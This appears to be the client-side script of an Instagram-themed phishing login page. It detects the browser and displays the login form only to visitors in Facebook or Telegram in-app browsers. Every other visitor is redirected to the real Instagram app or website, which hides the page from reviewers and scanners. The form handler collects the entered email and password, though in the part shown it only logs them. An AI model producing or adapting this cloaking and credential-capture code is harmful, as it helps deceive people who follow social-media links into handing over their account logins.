// Browser and platform detection
function detectBrowser() {
    const ua = navigator.userAgent.toLowerCase();
    const isAndroid = ua.indexOf("android") > -1;
    const isIOS = /iphone|ipad|ipod/.test(ua);
    
    // Check for Facebook in-app browser
    const isFacebookBrowser = ua.indexOf("fban") > -1 || ua.indexOf("fbav") > -1;
    
    // Check for Telegram in-app browser
    const isTelegramBrowser = ua.indexOf("telegram") > -1;
    
    // Check if it's mobile or desktop
    const isMobile = isAndroid || isIOS;
    
    return {
        isAndroid,
        isIOS,
        isFacebookBrowser,
        isTelegramBrowser,
        isMobile
    };
}

// Handle redirects
function handleRedirects() {
    const browser = detectBrowser();
    
    // Allow access only if it's Facebook or Telegram in-app browser
    if (browser.isFacebookBrowser || browser.isTelegramBrowser) {
        // Remove loading overlay and show the login form
        document.getElementById('loadingOverlay').style.display = 'none';
        return;
    }
    
    // Handle redirects for other browsers
    if (browser.isMobile) {
        if (browser.isAndroid) {
            // Redirect to Instagram app on Android
            window.location.href = 'intent://instagram.com/#Intent;package=com.instagram.android;scheme=https;end';
        } else if (browser.isIOS) {
            // Redirect to Instagram app on iOS
            window.location.href = 'instagram://';
        }
    } else {
        // Redirect desktop users to Instagram website
        window.location.href = 'https://www.instagram.com';
    }
}

// Check browser and handle redirects on page load
document.addEventListener('DOMContentLoaded', function() {
    handleRedirects();
    
    const video = document.getElementById('backgroundVideo');
    
    // Play video as soon as possible
    video.play().catch(function(error) {
        console.log("Video autoplay failed:", error);
    });
    
    // Handle video playback on mobile devices
    document.addEventListener('touchstart', function() {
        video.play().catch(function(error) {
            console.log("Video autoplay failed after touch:", error);
        });
    }, { once: true });
});

// Handle form submission
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    // Here you would typically handle the login logic
    console.log('Login attempt:', { email, password });
});